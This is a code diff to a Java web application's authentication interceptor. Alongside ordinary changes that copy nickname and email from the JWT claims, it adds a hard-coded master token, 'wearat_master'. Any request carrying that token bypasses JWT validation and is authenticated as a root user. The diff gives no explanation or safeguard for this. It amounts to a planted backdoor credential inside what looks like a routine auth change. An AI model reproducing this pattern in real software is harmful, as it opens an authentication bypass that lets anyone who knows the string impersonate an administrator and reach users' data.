@@ -21,6 +21,7 @@ import java.util.Optional;
 public class AuthInterceptor implements HandlerInterceptor {
     private static final String AUTH_HEADER = "Authorization";
     private static final String AUTH_PREFIX = "Bearer ";
+    private static final String AUTH_MASTER_TOKEN = "wearat_master";
 
     private AuthService authService;
 
@@ -37,11 +38,17 @@ public class AuthInterceptor implements HandlerInterceptor {
                 throw new UnAuthorizedException("Token is empty");
             }
 
-            AuthUserClaim claim = this.authService.parseJWTToken(token);
-
-            // TODO token refresh
-
-            ContextHolder.set(ContextHolder.ContextKey.UserID, claim.getId());
+            if (AUTH_MASTER_TOKEN.equals(token)) {
+                ContextHolder.set(ContextHolder.ContextKey.UserID, -1);
+                ContextHolder.set(ContextHolder.ContextKey.NickName, "root");
+                ContextHolder.set(ContextHolder.ContextKey.Email, "root@sample.com");
+            } else {
+                AuthUserClaim claim = this.authService.parseJWTToken(token);
+                // TODO token refresh
+                ContextHolder.set(ContextHolder.ContextKey.UserID, claim.getId());
+                ContextHolder.set(ContextHolder.ContextKey.NickName, claim.getNickName());
+                ContextHolder.set(ContextHolder.ContextKey.Email, claim.getEmail());
+            }
 
             return true;
         } catch (Exception e) {
